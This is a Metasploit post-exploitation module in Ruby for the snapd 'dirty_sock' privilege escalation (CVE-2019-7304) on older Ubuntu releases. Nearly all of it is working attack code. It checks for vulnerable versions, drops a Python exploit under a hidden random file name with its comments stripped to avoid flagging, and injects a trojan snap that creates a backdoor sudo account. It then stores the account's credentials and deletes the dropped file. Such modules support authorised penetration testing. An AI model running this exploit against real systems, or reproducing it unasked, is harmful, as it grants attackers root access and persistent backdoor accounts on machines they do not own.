##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  Rank = ManualRanking # not needed for post, but leaving here since this exploit is so finicky

  include Msf::Post::Linux::Priv
  include Msf::Post::File
  include Msf::Exploit::FileDropper
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Ubuntu snapd Remote Socket Priv Esc',
        'Description' => %q{
          This module exploits a vulnerability in the snapd service < 2.34.2 on Ubuntu
          14.04-18.04 and < 2.35.5 on Ubuntu 18.10.
          The service incorrectly parses a unix socket file name
          containing a UID parameter, and honors it as the UID for the process.

          Exploitation can be complicated since the snap container is run from a sandbox
          with limited read/write to some files on the filesystem.  The exploit creates
          a new user with sudo privileges, by default msf:dirty_sock.  Upon successful
          exploitation, the credentials may take a minute to become viable.

          Exploitation will also cause snapd to perform an update on itself, so this is
          a one shot exploit.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die', # msf module
          'Chris Moberly' # original PoC, analysis
        ],
        'Platform' => ['linux'],
        'SessionTypes' => [ 'shell', 'meterpreter' ],
        'Targets' => [[ 'Auto', {} ]],
        'Privileged' => true,
        'References' => [
          [ 'EDB', '46362' ],
          [ 'EDB', '46361' ],
          [ 'URL', 'https://ubuntu.com/security/notices/USN-3887-1' ],
          [ 'URL', 'https://github.com/initstring/dirty_sock' ],
          [ 'URL', 'https://initblog.com/2019/dirty-sock/' ],
          [ 'CVE', '2019-7304' ]
        ],
        'DisclosureDate' => '2019-02-13',
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [ARTIFACTS_ON_DISK, CONFIG_CHANGES], # CONFIG_CHANGES since it can cause snapd to update itself
          'SideEffects' => [UNRELIABLE_SESSION], # since it can cause snapd to update itself
          'AKA' => ['dirty_sock']
        }
      )
    )
    register_options([
      OptPath.new('SQUASH', [true, 'The squashFS file of the snap container', ::File.join(::Msf::Config.data_directory, 'exploits', 'CVE-2019-7304', 'squash.fs') ])
    ])
    register_advanced_options [
      OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])
    ]
  end

  def base_dir
    datastore['WritableDir'].to_s
  end

  def check
    ubuntu_release = cmd_exec('grep "VERSION_ID" /etc/os-release').split('=')[1].gsub('"', '')
    ubuntu_release = Rex::Version.new(ubuntu_release)
    unless command_exists?('snap')
      return Msf::Exploit::CheckCode::Safe('Snap executable not found')
    end

    snapd_version = cmd_exec('snap version | grep snapd').split(' ')[1]
    snapd_version = Rex::Version.new(snapd_version)
    print_status("Found snapd #{snapd_version} on Ubuntu #{ubuntu_release}")
    if snapd_version < Rex::Version.new('2.34.2') &&
       (
          ubuntu_release == Rex::Version.new('14.04') ||
          ubuntu_release == Rex::Version.new('16.04') ||
          ubuntu_release == Rex::Version.new('18.04')
        )
      return Msf::Exploit::CheckCode::Appears('Vulnerable version of snapd found')
    elsif ubuntu_release == Rex::Version.new('18.10') && snapd_version < Rex::Version.new('2.35.5')
      return Msf::Exploit::CheckCode::Appears('Vulnerable version of snapd found')
    end

    Msf::Exploit::CheckCode::Safe('Non-vulnerable version of snapd found')
  end

  def strip_python_comments(code)
    code.gsub('^\s*#[^!].*$', '').gsub('^\s""".*?"""$', '')
  end

  def find_exec_program
    return 'python' if command_exists?('python')
    return 'python3' if command_exists?('python3')

    return false
  end

  def run
    # Check if we're already root
    if is_root? && !datastore['ForceExploit']
      fail_with(Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override')
    end

    # Make sure we can write our socket
    unless writable? base_dir
      fail_with(Failure::BadConfig, "#{base_dir} is not writable")
    end

    python_binary = find_exec_program

    fail_with(Failure::NotFound, 'The python binary was not found') unless python_binary

    vprint_status("Using '#{python_binary}' to run exploit")

    squash = Rex::Text.encode_base64(File.open(datastore['SQUASH'], 'rb').read)
    squash_md5 = Rex::Text.md5(squash)

    executable_name = ".#{Rex::Text.rand_text_alphanumeric(5..10)}"
    executable_path = "#{base_dir}/#{executable_name}"
    temp_file = Rex::Quickfile.new('dirty_sockv2.py')
    # strip comments and other flagable things
    code = strip_python_comments(exploit_data('CVE-2019-7304', 'dirty_sockv2.py'))
    # put in our new payload
    code.gsub!('TROJAN_SNAP = ""', "TROJAN_SNAP = \"\"\"#{squash}\"\"\"")
    temp_file.write(code)
    print_status "Writing exploit to #{executable_path}"
    upload_file(executable_path, temp_file)

    timeout = 60
    print_status "Launching exploit: #{python_binary} #{executable_path}"
    output = cmd_exec "#{python_binary} #{executable_path}", nil, timeout
    output.each_line { |line| print_status line.chomp }
    unless output.include? 'Success!'
      fail_with(Failure::Unknown, 'Exploit not successful, see above output for details.')
    end
    if squash_md5 == 'f2a574735ebece0fbec748f55726f583' # default snap payload
      print_good('Success! You can now login and sudo with msf:dirty_sock. However it may take several minutes for the account to finish creation.')
      credential_data = {
        origin_type: :session,
        post_reference_name: refname,
        private_type: :password,
        private_data: 'dirty_sock',
        session_id: session_db_id,
        username: 'msf',
        workspace_id: myworkspace_id
      }
      create_credential(credential_data)
    else
      print_good('Success! Your payload most likely ran')
    end
    Rex.sleep(5)
    register_file_for_cleanup(executable_path)
  end
end
